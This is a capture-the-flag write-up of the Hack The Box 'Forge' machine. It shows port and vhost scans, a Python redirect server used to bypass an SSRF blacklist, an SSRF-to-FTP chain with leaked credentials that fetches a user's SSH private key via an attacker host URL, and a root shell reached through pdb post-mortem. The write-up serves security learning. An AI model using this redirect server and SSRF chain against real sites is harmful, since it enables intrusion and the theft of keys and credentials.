---
title: 'HTB | Forge'
published: 2025-07-02
draft: false
description: 'HTB Machine `Forge` writeup.'
tags: ['HackTheBox', 'linux']
---

# Recon

## Port Scanning

### TCP Scan - all ports

```
# Nmap 7.94SVN scan initiated Thu Sep  4 11:50:57 2025 as: nmap -sC -sV -p21,22,80 -Pn -n -vv -oN nmap/tcp_deep 10.10.11.111
Nmap scan report for 10.10.11.111
Host is up, received user-set (0.072s latency).
Scanned at 2025-09-04 11:50:57 IST for 12s

PORT   STATE    SERVICE REASON         VERSION
21/tcp filtered ftp     no-response
22/tcp open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2sK9Bs3bKpmIER8QElFzWVwM0V/pval09g7BOCYMOZihHpPeE4S2aCt0oe9/KHyALDgtRb3++WLuaI6tdYA1k4bhZU/0bPENKBp6ykWUsWieSSarmd0sfekrbcqob69pUJSxIVzLrzXbg4CWnnLh/UMLc3emGkXxjLOkR1APIZff3lXIDr8j2U3vDAwgbQINDinJaFTjDcXkOY57u4s2Si4XjJZnQVXuf8jGZxyyMKY/L/RYxRiZVhDGzEzEBxyLTgr5rHi3RF+mOtzn3s5oJvVSIZlh15h2qoJX1v7N/N5/7L1RR9rV3HZzDT+reKtdgUHEAKXRdfrff04hXy6aepQm+kb4zOJRiuzZSw6ml/N0ITJy/L6a88PJflpctPU4XKmVX5KxMasRKlRM4AMfzrcJaLgYYo1bVC9Ik+cCt7UjtvIwNZUcNMzFhxWFYFPhGVJ4HC0Cs2AuUC8T0LisZfysm61pLRUGP7ScPo5IJhwlMxncYgFzDrFRig3DlFQ0=
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH67/BaxpvT3XsefC62xfP5fvtcKxG2J2di6u8wupaiDIPxABb5/S1qecyoQJYGGJJOHyKlVdqgF1Odf2hAA69Y=
|   256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcTSbyCdqkw29aShdKmVhnudyA2B6g6ULjspAQpHLIC
80/tcp open     http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  4 11:51:09 2025 -- 1 IP address (1 host up) scanned in 12.13 seconds

```

- Open ports : 22 (SSH) & 80 (HTTP)
- Filtered port : 21 (FTP) , blocked likely by a firewall
- Port 80 redirects to `http://forge.htb` --> added to `/etc/hosts` file

### UDP Scan

- No open ports found.

## Web App @80

### Vhost Bruteforce

```shell
$ gobuster vhost -u http://forge.htb/ -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -o vhost/forge.htb
<snip>
Found: admin.forge.htb Status: 200 [Size: 27]
```

- found `admin.forge.htb` , which only reachable from `localhost`.
- No way to identify any url paths, even garbage values return `Unauthorized`.

### Directory Bruteforce

```shell
$ feroxbuster -u http://forge.htb/ -o dirbust/forge.htb --json
```

**Results**

```shell
$ jqf dirbust/forge.htb
/upload
/static/css/main.css
/uploads
/static/css/upload.css
/static/js/main.js
/static/css/static
/static
/static/images/static
/static/js/static
/static/images/image9.jpg
/static/images/image3.jpg
/static/images/image5.jpg
/static/images/image4.jpg
/static/images/image2.jpg
/static/images/image8.jpg
/static/images/image7.jpg
/static/images/image1.jpg
/static/images/image6.jpg
/
/server-status
```

### Site

- The site looks like an online gallery for images.
- At `upload` page, there are 2 options available to upload a file :
  - From local file upload
  - From a URL
- Uploading a local file, it returns a url for the uploaded file placed under `/uploads/`
- Uploading from a url returns fetches the resource and saves its response to a file under `/uploads/` folder.

# Exploitation

## SSRF in Upload from URL

- Trying basic ssrf by trying to fetch `admin.forge.htb` or `localhost` or `127.0.0.1` does not work as the app implements a `blacklist` for the complete `url`.
- There is also no point in trying to use `gopher` urls as the server uses the library `python-requests/2.25.1` (shown in `User-Agent`) which does not `gopher urls`.
- However, this library does **follows redirects by default**.
- Meaning, If I send a request to a server I own and then redirect it to say `localhost` or `admin.forge.htb` , it will work.
- I quickly generate a `redirect-server.py` from `claude` that wil redirect all incoming requests to a particular domain and for the path, it will use the value it receives from `?redirect` param.

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        redirect_url = 'http://admin.forge.htb' + query_params.get('redirect', [None])[0]

        print("----- Request Headers -----")
        for key, value in self.headers.items():
            print(f"{key}: {value}")
        print("--------------------------")
        print(f"Redirecting to: {redirect_url}")

        if redirect_url:
            self.send_response(302)
            self.send_header('Location', redirect_url)
            self.end_headers()
        else:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Missing redirect parameter")

    def do_POST(self):
        self.do_GET()

if __name__ == "__main__":
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, RedirectHandler)
    print(f"Serving redirect on port {server_address[1]}")
    httpd.serve_forever()
```

### Accessing `admin.forge.htb`

**`/index.html`**

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Admin Portal</title>
  </head>
  <body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css" />
    <header>
      <nav>
        <h1 class=""><a href="/">Portal home</a></h1>
        <h1 class="align-right margin-right">
          <a href="/announcements">Announcements</a>
        </h1>
        <h1 class="align-right"><a href="/upload">Upload image</a></h1>
      </nav>
    </header>
    <br /><br /><br /><br />
    <br /><br /><br /><br />
    <center><h1>Welcome Admins!</h1></center>
  </body>
</html>
```

- highlights 2 routes : `/announcements` & `/upload`

**`/announcements`**

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Announcements</title>
  </head>
  <body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css" />
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css" />
    <header>
      <nav>
        <h1 class=""><a href="/">Portal home</a></h1>
        <h1 class="align-right margin-right">
          <a href="/announcements">Announcements</a>
        </h1>
        <h1 class="align-right"><a href="/upload">Upload image</a></h1>
      </nav>
    </header>
    <br /><br /><br />
    <ul>
      <li>
        An internal ftp server has been setup with credentials as
        user:heightofsecurity123!
      </li>
      <li>
        The /upload endpoint now supports ftp, ftps, http and https protocols for
        uploading from url.
      </li>
      <li>
        The /upload endpoint has been configured for easy scripting of uploads, and for
        uploading an image, one can simply pass a url with ?u=&lt;url&gt;.
      </li>
    </ul>
  </body>
</html>
```

- The `/upload` endpoint at `admin.forge.htb` supports `ftp`.
- To access, credentials are : `user` / `heightofsecurity123!`
- The `/upload` endpoint can use a `?u` query param to fetch a remote file.

### Accessing Forge's ftp server

- Changing `redirect_url` to :
  `redirect_url = 'http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@localhost' + query_params.get('redirect', [None])[0]` , I can read all files available on the ftp server.

- I will submit this `url` to read `forge`'s `id_rsa` file.
  `http://10.10.14.23:8000/?redirect=/.ssh/id_rsa`
- The resultant url to the image contains the ssh key, which I can use to login as `user`.

# Post Exploitation

## Privilege Escalation / Shell as `root`

- User `user` can run the following on `forge`.

```
User user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

### Python Library Hijack - Fail

- This will not work as I need `write` access to the `/opt` directory, the directory where the script is located.
- No misconfigured permissions are available on other dependencies folders either.

### Python script

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

The script looks immune except the line `pdb.post_mortem(e.__traceback__)`

- `pdb` module - Its interactive python debugger that lets us step in code, examine variables and understand what went wrong.
- It lets us run python code in the context of the user the program is running which is in this case `root`.

**Exploiting script to get command execution as `root`**

- The script starts a socket listener at a random port and allows a connection from `localhost` to connect to it.
- I will spawn 2 shell for user `user` with `ssh`. One will run the script as `root` , and the other one will connect to the socket generated by the script.
- Next, I need to cause an error, to get the program to run its debugger. The simplest way is to submit a character when it expects an integer.
- At the first teminal, the debugger is spawned. It can now run python code, as `root`
- With this, I spawn `bash` and I will get a shell as `root`.

```shell
(Pdb) import os
(Pdb) os.system('bash')
root@forge:/home/user#
```
